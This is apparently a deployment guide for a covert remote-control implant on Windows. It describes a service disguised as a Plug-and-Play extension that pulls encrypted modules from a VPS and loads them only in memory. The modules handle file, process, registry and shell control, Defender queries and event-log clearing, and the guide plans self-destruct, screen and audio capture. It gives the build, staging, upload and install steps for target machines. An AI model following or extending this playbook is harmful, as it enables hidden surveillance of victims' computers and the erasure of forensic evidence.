# Stage-2 Deployment Guide

One-page reference for activating the stage-2 (encrypted in-memory) modules
in production.

## What stage-2 does

Extracts sensitive command-handling code (file mutations, process/registry
control, Defender state queries, eventlog clears) out of `pnpext.dll` and
into encrypted `.bin` blobs that are:

- stored **only on the VPS**
- fetched by the host over its existing auth'd WebSocket
- reflectively loaded into RAM only (never decrypted to disk)
- wiped from the `%TEMP%\pnp_cache\` cache when the service stops

## Current status (master branch)

3 modules extracted, 17 commands total, 21/21 integration tests PASS:

| Module | Commands | Size (.bin) |
|---|---|---|
| `filemgr.bin`  | `file_delete`, `file_mkdir`, `file_rename`, `file_copy`, `file_write_text`, `config_write` | ~270 KB |
| `procmgr.bin`  | `proc_kill`, `proc_launch`, `term_exec`, `svc_control`, `reg_set_value`, `reg_delete_value`, `reg_create_key`, `reg_delete_key` | ~250 KB |
| `defender.bin` | `defender_status`, `host_restart`, `eventlog_delete` (whole-log clear) | ~250 KB |

Without deployed blobs the host transparently falls back to the stage-1
handlers in `pnpext.dll` — behaviour is identical to the pre-stage-2
build, no user-visible difference.

## Deploy workflow

### 1. Build the host and modules

```cmd
powershell -ExecutionPolicy Bypass -File run_build.ps1
```

Produces:
- `build/bin/pnpext.dll`                — stage-1 host (with stage-2 loader)
- `build/stage2/{filemgr,procmgr,defender}.dll`   — unencrypted modules
- `build/stage2/{filemgr,procmgr,defender}.bin`   — encrypted with `dev-token` (useful for local tests only)

### 2. Verify locally

```cmd
powershell -ExecutionPolicy Bypass -File run_all_tests.ps1
```

Expect `ALL 5 TESTS PASSED`.

### 3. Bundle blobs for a real room_token

```cmd
python _deploy_stage2.py <YOUR_ROOM_TOKEN>
```

Outputs:
- `deploy/stage2/<YOUR_ROOM_TOKEN>/filemgr.bin`
- `deploy/stage2/<YOUR_ROOM_TOKEN>/procmgr.bin`
- `deploy/stage2/<YOUR_ROOM_TOKEN>/defender.bin`
- `deploy/stage2/<YOUR_ROOM_TOKEN>/README.txt` (sha256 fingerprints + upload tips)

You can also pass `--from-config build/bin/host_config.json` to auto-pick
the token from the unencrypted test config.

### 4. Upload to VPS

```bash
scp -r deploy/stage2/<YOUR_ROOM_TOKEN> root@vps:/opt/remotedesk/stage2/
# server.py reads from /opt/remotedesk/stage2 by default (env: RDP_STAGE2_DIR)
# No server restart needed — files are read on each stage2_fetch request.
```

### 5. Install the host

```cmd
REM from dist/usb on target machine (as admin)
uninstall-cmd.bat
install-cmd.bat
sc query WPnpSvc
```

Should report `STATE : 4 RUNNING`. After ~5s the host will send
`stage2_fetch` messages to the VPS and begin routing file/proc/registry
commands through the in-memory modules.

## Confirming stage-2 is active

On Windows (target host):
```cmd
dir %TEMP%\pnp_cache\
```
Should show `.bin` files during service runtime. They're deleted on `sc stop`.

In `Event Viewer → Windows Logs → Application`, filtered by source=`WPnpSvc`,
you should see entries like:
```
stage2: loaded filemgr
stage2: loaded procmgr
stage2: loaded defender
```

On the VPS, `rdp-server` log should show:
```
stage2: served filemgr.bin (269,340 bytes) to host token=XXXXX
stage2: served procmgr.bin (247,324 bytes) to host token=XXXXX
stage2: served defender.bin (248,348 bytes) to host token=XXXXX
```

## Rollback

If anything breaks, the no-stage-2 baseline is always available:
```cmd
git checkout v1.0.164-last-working
# rebuild + reinstall as above
```

## Adding a new module

1. Create `stage2_<name>.cpp` following the pattern of `stage2_filemgr.cpp`:
   - Include `stage2_abi.h` + `stage2_util.h`
   - Implement `Stage2Init(Stage2HostCtx*)` — register your commands
   - Implement `Stage2Shutdown()` — optional cleanup
2. Add `add_stage2_module(<name> stage2_<name>.cpp)` to `CMakeLists.txt`.
3. Add `<name>` to `STAGE2_KNOWN_MODULES` whitelist in `server.py`.
4. Add the command → module mapping in `stage2_loader.h`'s `cmd_to_module()`.
5. Write `stage2_<name>_test.cpp` using the pattern of the other tests.
6. Add build target + test runner entry in `CMakeLists.txt` + `run_all_tests.ps1`.
7. `python _deploy_stage2.py <token>` — it auto-picks up any new module DLL.

## Known limitations

- **Selective eventlog deletion** (with ids) not yet in `defender.bin`;
  falls back to stage-1. Trivial-path whole-log clear IS extracted.
- **`host_update` / `self_destruct` / `evtlog_set_config`** remain in
  stage-1 — each needs a small HostCtx ABI extension (exit-request,
  path-query, config-write callbacks) which is deferred until the
  currently-deployed modules are battle-tested.
- **screenshot / audio / stream** modules not yet extracted — they
  depend on session-0 → user-session IPC that currently lives in
  `dllmain.cpp`. The IPC / helper-spawn machinery will need
  HostCtx callbacks before those modules can be cleanly split out.

## File index

- `stage2_abi.h`              — HostCtx shape + Stage2Init signature (ABI v1)
- `aes_gcm.h`                 — AES-256-GCM on OpenSSL EVP
- `reflective_loader.h`       — in-memory PE loader
- `stage2_loader.h`           — Registry, dispatch, fetch, cache wipe
- `stage2_util.h`             — JSON parse + response builders for modules
- `stage2_{filemgr,procmgr,defender,sample}.cpp`  — modules
- `stage2_*_test.cpp`         — per-module integration tests
- `_gen_stage2_blob.py`       — DLL → encrypted .bin
- `_deploy_stage2.py`         — bundle for a room_token (this guide's tool)
- `server.py`                 — has the `stage2_fetch` WSS handler
